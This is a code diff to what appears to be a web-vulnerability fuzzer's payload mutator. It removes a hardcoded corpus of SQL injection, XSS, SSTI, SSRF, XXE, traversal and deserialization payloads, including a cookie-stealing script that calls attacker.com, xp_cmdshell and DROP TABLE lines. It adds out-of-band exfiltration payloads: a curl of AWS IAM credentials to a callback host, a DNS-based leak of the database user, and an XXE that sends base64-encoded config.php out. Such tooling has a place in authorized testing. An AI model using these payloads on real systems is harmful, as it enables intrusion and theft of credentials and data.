@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import os
 import itertools
 import random
 import re
@@ -7,74 +8,39 @@ import uuid
 import urllib.parse
 from typing import Callable, Iterator, List, Optional
 
-CORPUS: dict[str, list[str]] = {
-    "sqli": [
-        "' OR '1'='1",
-        "' OR 1=1--",
-        '" OR "1"="1',
-        "1' AND SLEEP(5)--",
-        "1; SELECT SLEEP(5)--",
-        "' UNION SELECT NULL,NULL,NULL--",
-        "' UNION SELECT username,password FROM users--",
-        "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
-        "'; EXEC xp_cmdshell('whoami')--",
-        "' AND 1=1--",
-        "' AND 1=2--",
-        "';WAITFOR DELAY '0:0:5'--",
-        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))xyz)--",
-        "1; DROP TABLE users--",
-    ],
-    "xss": [
-        "<script>alert(1)</script>",
-        "<img src=x onerror=alert(1)>",
-        "'\"><script>alert(1)</script>",
-        "<svg onload=alert(1)>",
-        "<body onload=alert(1)>",
-        "javascript:alert(1)",
-        "<iframe src=javascript:alert(1)>",
-        '"><img src=x onerror="alert(1)">',
-        "';alert(String.fromCharCode(88,83,83))//",
-        "<script>fetch('https://attacker.com?c='+document.cookie)</script>",
-    ],
-    "ssti": [
-        "{{7*7}}",
-        "${7*7}",
-        "{{config}}",
-        "{{self.__class__.__mro__[1].__subclasses__()}}",
-        "{%for x in [1]%}{{x.__class__.__bases__}}{%endfor%}",
-        "#{7*7}",
-        "*{7*7}",
-        "<%= 7*7 %>",
-    ],
-    "ssrf": [
-        "http://169.254.169.254/latest/meta-data/",
-        "http://127.0.0.1:22/",
-        "http://localhost:6379/",
-        "http://[::1]/",
-        "file:///etc/passwd",
-        "dict://127.0.0.1:6379/info",
-        "gopher://127.0.0.1:6379/_INFO%0D%0A",
-        "http://0.0.0.0/",
-    ],
-    "xxe": [
-        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://attacker.com/x">]><root>&test;</root>',
-    ],
-    "idor": [
-        "1",
-        "0",
-        "-1",
-        "999999",
-        "2",
-        "../",
-        "../../etc/passwd",
-        "%2e%2e%2f",
-    ],
-    "deserial": [
-        'O:8:"stdClass":0:{}',
-        "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
-    ],
-}
+def load_corpus() -> dict[str, list[str]]:
+    """Dynamically load payloads from data/wordlists/ subdirectories."""
+    corpus: dict[str, list[str]] = {}
+    base_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "data", "wordlists")
+    
+    if not os.path.exists(base_dir):
+        return {}
+
+    # Standard categories to scan
+    categories = ["sqli", "xss", "ssti", "ssrf", "xxe", "idor", "deserial"]
+    
+    for category in categories:
+        cat_dir = os.path.join(base_dir, category)
+        if not os.path.exists(cat_dir):
+            continue
+            
+        corpus[category] = []
+        for filename in os.listdir(cat_dir):
+            if filename.endswith(".txt"):
+                filepath = os.path.join(cat_dir, filename)
+                try:
+                    with open(filepath, "r", encoding="utf-8") as f:
+                        for line in f:
+                            line = line.strip()
+                            # Ignore comments and empty lines
+                            if line and not line.startswith("#"):
+                                corpus[category].append(line)
+                except Exception:
+                    continue
+    
+    return corpus
+
+CORPUS = load_corpus()
 
 
 def _url_encode(s: str) -> str:
@@ -306,16 +272,18 @@ class Mutator:
 
         payloads = list(CORPUS.get(category, []))
         
-        # OAST Injection
+        # OAST Injection & Exfiltration
         if category in ("ssrf", "sqli", "xxe") and self.oast_domain:
             oast_target = self._get_oast_url()
             if category == "ssrf":
                 payloads.append(f"http://{oast_target}/")
+                # Exfiltration example (AWS metadata)
+                payloads.append(f"http://{oast_target}/?exfil=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64`")
             elif category == "sqli":
                 # Blind OOB SQLi (MySQL example)
-                payloads.append(f"'; SELECT LOAD_FILE(CONCAT('\\\\\\\\', '{oast_target}', '\\\\a'))--")
+                payloads.append(f"'; SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT HEX(user())), '.', '{oast_target}', '\\\\a'))--")
             elif category == "xxe":
-                payloads.append(f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oast_target}/">]><foo>&xxe;</foo>')
+                payloads.append(f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=config.php"><!ENTITY % remote SYSTEM "http://{oast_target}/?d=%data;">%remote;]>')
 
         for seed in payloads:
             chain: list[str] = []
